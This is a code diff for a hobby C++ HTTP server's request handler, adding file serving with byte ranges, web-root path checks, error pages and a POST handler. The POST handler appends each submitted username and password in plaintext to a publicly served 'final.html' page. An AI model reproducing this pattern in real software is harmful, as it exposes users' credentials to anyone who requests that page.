@@ -7,59 +7,329 @@
 
 #include "../Runtime/task.hpp"
 #include "http_handler.hpp"
+#include "../HTTP/HTTP1_1/HTTP.hpp"
+#include "../HTTP/HTTP1_1/mimemap.hpp"
+#include "../TLS/Cryptography/one_way/keccak.hpp"
+#include <algorithm>
+#include <string>
 
 #include "../global.hpp"
 
 namespace fbw {
 
-// handle stream starts when headers have been received
-task<void> application_handler(std::shared_ptr<http_ctx> connection) {
-    assert(connection != nullptr);
-    std::vector<entry_t> request_headers = connection->get_headers();
+std::optional<std::string> find_header(const std::vector<entry_t>& request_headers, std::string header) {
+    header = to_lower(header);
+    auto it = std::find_if(request_headers.begin(), request_headers.end(), [&](const entry_t& entry){ return entry.name == header; });
+    if(it == request_headers.end()) {
+        return std::nullopt;
+    }
+    return it->value;
+}
 
-    auto method_it = std::find_if(request_headers.begin(), request_headers.end(), [](const entry_t& entry){ return entry.name == ":method"; });
-    if(method_it == request_headers.end()) {
-        co_return;
+std::string replace_all_app(std::string str, const std::string& from, const std::string& to) {
+    size_t start_pos = 0;
+    while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
+        str.replace(start_pos, from.size(), to);
+        start_pos += to.size();
     }
-    
-    if(method_it->value == "POST") {
-        ustring some_data;
-        do {
-            auto [ res, end ] = co_await connection->append_http_data(some_data);
-            if(res != stream_result::ok) {
-                co_return;
-            }
-            if(!end) {
-                continue;
-            }
-        } while(false);
-    }
-    
+    return str;
+};
+
+void write_body_app(std::string body) {
+    std::ofstream fout(project_options.webpage_folder/project_options.default_subfolder/"final.html", std::ios_base::app);
+    body = replace_all_app(std::move(body), "username=", "username: ");
+    body = replace_all_app(std::move(body), "&password=", ", password: ");
+    body = replace_all_app(std::move(body), "&confirm=", ", confirmed: ");
+    body = replace_all_app(std::move(body), "<", "&lt;");
+    body = replace_all_app(std::move(body), ">", "&gt;");
+    body.append("</p>");
+    body.insert(0,"<p>");
+    fout << body << std::endl;
+}
+
+
+task<void> send_error(http_ctx& connection, uint32_t status_code, std::string status_message) {
     std::vector<entry_t> send_headers;
-    const std::string message = "<HTML>HELLO WORLD</HTML>";
-    if(method_it == send_headers.end() or method_it->value != "GET") {
-        send_headers.push_back({":status", "500"});
-        send_headers.push_back({"content-length", std::to_string(message.size())});
-        auto res = co_await connection->write_headers(send_headers);
-        if(res != stream_result::ok) {
-            co_return;
-        }
-        auto umessage = to_unsigned(message);
-        std::span<const uint8_t> sp {(uint8_t*)umessage.data(), umessage.size()};
-        co_await connection->write_data(sp);
-        co_return;
-    }
-    send_headers.push_back({":status", "200"});
+    std::string message = error_to_html(status_code, status_message);
+    send_headers.push_back({":status", std::to_string(status_code)});
     send_headers.push_back({"content-length", std::to_string(message.size())});
     send_headers.push_back({"content-type", "text/html; charset=utf-8"});
-    auto res = co_await connection->write_headers(send_headers);
+    send_headers.push_back({"server", "FredPi/0.1 (Unix) (Raspbian/Linux)"});
+    auto res = co_await connection.write_headers(send_headers);
     if(res != stream_result::ok) {
         co_return;
     }
+    auto umessage = to_unsigned(message);
+    std::span<const uint8_t> sp {umessage};
+    auto resu = co_await connection.write_data(sp, true);
+    if(resu != stream_result::ok) {
+        co_return;
+    }
+}
+
+std::vector<entry_t> headers_to_send(ssize_t file_size, std::string mime, bool full = true) {
+    auto time = std::time(0);
+    constexpr time_t day = 24*60*60;
+    std::vector<entry_t> out;
+    std::string status_code;
+    if(file_size == 0) {
+        status_code = "204";
+    } else {
+        if(!full) {
+            status_code = "206";
+        } else {
+            status_code = "200";
+        }
+    }
+    out.push_back({":status", status_code});
+    if(file_size != 0) {
+        out.push_back({"content-length", std::to_string(file_size)});
+    }
+    out.push_back({"date", timestring(time)});
+    out.push_back({"expires", timestring(time + day)});
+    auto content_type = mime + (mime.substr(0, 4) == "text" ? "; charset=UTF-8" : "");
+    out.push_back({"content-type", content_type});
+    out.push_back({"server", make_server_name()});
     
-    std::span<const uint8_t> sp {(uint8_t*)message.data(), message.size()};
-    co_await connection->write_data(sp, true);
+    return out;
+}
+
+task<stream_result> app_send_body_slice(http_ctx& conn, std::ifstream& file, ssize_t begin, ssize_t end, bool end_of_data = true) {
+    std::vector<uint8_t> buffer;
+    file.seekg(begin);
+    while(file.tellg() != end && !file.eof()) {
+        auto next_buffer_size = std::min(FILE_READ_SIZE, ssize_t(end - file.tellg()));
+        buffer.resize(next_buffer_size);
+        file.read(reinterpret_cast<char*>(buffer.data()), buffer.size());
+        const bool is_last_chunk = (file.tellg() >= end || file.eof()) and end_of_data;
+        auto res = co_await conn.write_data(buffer, is_last_chunk);
+        if(res != stream_result::ok) [[unlikely]] {
+            co_return res;
+        }
+        assert(file.tellg() <= end);
+    }
+    co_return stream_result::ok;
+}
+
+std::string http1_1_range_header(std::pair<ssize_t, ssize_t> range, ssize_t file_size) {
+    return "Content-Range: bytes " + std::to_string(range.first) + "-" + std::to_string(range.second) + "/" + std::to_string(file_size) + "\r\n\r\n";
+}
+
+task<bool> send_ranged_response(http_ctx& conn, std::ifstream& file, ssize_t file_size, std::string mime, const std::pair<size_t, size_t> range,  bool send_body) {
+    size_t end = range.second + 1;
+    const auto desired_content_size = end - range.first;
+    if(desired_content_size > RANGE_SUGGESTED_SIZE) {
+        const auto diff = desired_content_size - RANGE_SUGGESTED_SIZE;
+        end -= diff;
+    }
+    const auto content_size = end - range.first;
+    auto headers = headers_to_send(content_size, mime, false);
+    headers.push_back({"accept-ranges", "bytes"});
+    headers.push_back({"content-range", "bytes " + std::to_string(range.first) + "-" + std::to_string(end - 1) + "/" + std::to_string(file_size)});
+    auto res = co_await conn.write_headers(headers);
+    if(res != stream_result::ok) {
+        co_return false;
+    }
+    if(send_body) {
+        co_await app_send_body_slice(conn, file, range.first, end);
+    }
+    co_return true;
+}
+
+task<void> send_multi_ranged_response(http_ctx& conn, std::ifstream& file, ssize_t file_size, std::string mime, std::vector<std::pair<size_t, size_t>> ranges,  bool send_body) {
+    std::array<uint8_t, 28> entropy;
+    randomgen.randgen(entropy);
+    std::string boundary_string;
+    for(unsigned c : entropy) {
+        boundary_string.push_back('A' + c % 26);
+    }
+    
+    std::string mid_bound =  "--" + boundary_string + "\r\nContent-Type: " + mime + "\r\n";
+    std::string end_bound = "--" + boundary_string + "--\r\n";
+
+    auto content_size = 0;
+    for(auto& range : ranges) {
+        content_size += mid_bound.size();
+        content_size += http1_1_range_header(range, file_size).size();
+        content_size += (1 + range.second - range.first);
+        content_size += std::string("\r\n").size();
+    }
+    content_size += end_bound.size();
+
+    auto headers = headers_to_send(content_size, "multipart/byteranges; boundary=" + boundary_string, false);
+    headers.push_back({"accept-ranges", "bytes"});
+
+    auto res = co_await conn.write_headers(headers);
+    if(res != stream_result::ok) {
+        co_return;
+    }
+    if(send_body) {
+        for(auto& range : ranges) {
+            auto delimi = to_unsigned(mid_bound + http1_1_range_header(range, file_size));
+            auto result = co_await conn.write_data(delimi);
+            if(result != stream_result::ok) {
+                co_return;
+            }
+            if(send_body) {
+                result = co_await app_send_body_slice(conn, file, range.first, range.second + 1, false);
+                if(result != stream_result::ok) {
+                    co_return;
+                }
+            }
+            auto endda = to_unsigned("\r\n");
+            result = co_await conn.write_data(endda);
+            if(result != stream_result::ok) {
+                co_return;
+            }
+        }
+        auto sig_end_bound = to_unsigned(end_bound);
+        co_await conn.write_data(sig_end_bound, true);
+    }
     co_return;
+}
+
+task<void> send_full_response(http_ctx& conn, std::ifstream& file, ssize_t file_size, std::string mime, bool send_body) {
+    auto headers = headers_to_send(file_size, mime);
+    if(file_size > RANGE_SUGGESTED_SIZE) {
+        headers.push_back({"accept-ranges", "bytes"});
+    }
+    auto res = co_await conn.write_headers(headers);
+    if(res != stream_result::ok) {
+        co_return;
+    }
+    if(send_body) {
+        co_await app_send_body_slice(conn, file, 0, file_size);
+    }
+    co_return;
+}
+
+task<void> handle_get_request(http_ctx& conn, const std::filesystem::path& file_path, const std::vector<entry_t>& headers, bool send_body) {
+    if(find_header(headers, "content-length")) {
+        throw http_error(400, "Bad Request");
+    }
+    // todo: check if HTTP/2 stream is half-closed local?
+    std::ifstream file(file_path, std::ifstream::ate | std::ifstream::binary);
+    if(file.fail()) {
+        throw http_error(404, "Not Found");
+    }
+    ssize_t file_size = file.tellg();
+    std::string mime = Mime_from_file(file_path);
+    auto range_hdr = find_header(headers, "range");
+    if (range_hdr) {
+        auto ranges = parse_range_header_2(*range_hdr, file_size);
+        if(ranges.empty()) {
+            throw http_error(400, "Bad Request");
+        }
+        if(ranges.size() == 1) {
+            co_await send_ranged_response(conn, file, file_size, mime, ranges[0], send_body);
+        } else {
+            co_await send_multi_ranged_response(conn, file, file_size, mime, ranges, send_body);
+        }
+    } else {
+        co_await send_full_response(conn, file, file_size, mime, send_body);
+    }
+}
+
+task<stream_result> read_all(http_ctx& connection, std::deque<uint8_t>& request_body) {
+    for(;;) {
+        auto [stream_st, data_done] = co_await connection.append_http_data(request_body);
+        if(stream_st != stream_result::ok) {
+            co_return stream_st;
+        }
+        if(data_done) {
+            break;
+        }
+    }
+    co_return stream_result::ok;
+}
+
+task<void> handle_post_request(http_ctx& connection, const std::filesystem::path& file_path, const std::vector<entry_t>& headers) {
+
+    std::string mime = Mime_from_file(file_path);
+
+    auto content_length = find_header(headers, "content-length");
+    if(!content_length) {
+        throw http_error(411, "Length Required");
+    }
+    ssize_t request_size;
+    try { 
+        request_size = std::stoll(*content_length);
+    } catch(std::exception& e) {
+        throw http_error(400, "Bad Request");
+    }
+    
+    if(request_size < 0) {
+        throw http_error(400, "Bad Request");
+    }
+
+    std::deque<uint8_t> request_body;
+    if(co_await read_all(connection, request_body) != stream_result::ok) {
+        co_return;
+    }
+    std::string body(request_body.begin(), request_body.end());
+    write_body_app(body);
+
+    std::ifstream file(file_path, std::ifstream::ate | std::ifstream::binary);
+    if(file.fail()) {
+        throw http_error(404, "Not Found");
+    }
+    ssize_t file_size = file.tellg();
+
+    co_await send_full_response(connection, file, file_size, mime, true);
+    co_return;
+}
+
+task<bool> handle_request(http_ctx& connection) {
+    const std::vector<entry_t> request_headers = connection.get_headers();
+    auto method = find_header(request_headers, ":method");
+    auto path = find_header(request_headers, ":path");
+    auto authority = find_header(request_headers, ":authority");
+    auto scheme = find_header(request_headers, ":scheme");
+
+    if (!method.has_value() or !path.has_value() or !scheme.has_value()) {
+        throw http_error(400, "Bad Request");
+    }
+    if(!authority or authority->starts_with("localhost")) {
+        authority = project_options.default_subfolder;
+    }
+
+    std::filesystem::path safe_path = fix_filename(*path);
+
+    auto webroot = project_options.webpage_folder;
+    
+    auto file_path = (webroot/(*authority)/(safe_path.relative_path()));
+    auto canonical_webroot = std::filesystem::canonical(webroot);
+    auto canonical_file = std::filesystem::weakly_canonical(file_path);
+
+    if (std::mismatch(canonical_webroot.begin(), canonical_webroot.end(), canonical_file.begin()).first != canonical_webroot.end()) {
+        throw http_error(403, "Forbidden");
+    }
+    if(method == "POST") {
+        co_await handle_post_request(connection, file_path, request_headers);
+    } else if(method == "GET") {
+        co_await handle_get_request(connection, file_path, request_headers, true);
+    } else if(method == "HEAD") {
+        co_await handle_get_request(connection, file_path, request_headers, false);
+    } else {
+        throw http_error(405, "Method Not Allowed");
+    }
+    co_return true;
+}
+
+// handle stream starts when headers have been received
+task<bool> application_handler(http_ctx& connection) {
+    std::optional<http_error> err;
+    try {
+        co_return co_await handle_request(connection);
+    } catch(const http_error& e) {
+        err = e;
+        goto END;
+    }
+    co_return false;
+END:
+    assert(err != std::nullopt);
+    co_await send_error(connection, err->m_http_code, err->what());
+    co_return false;
 }
 
 }
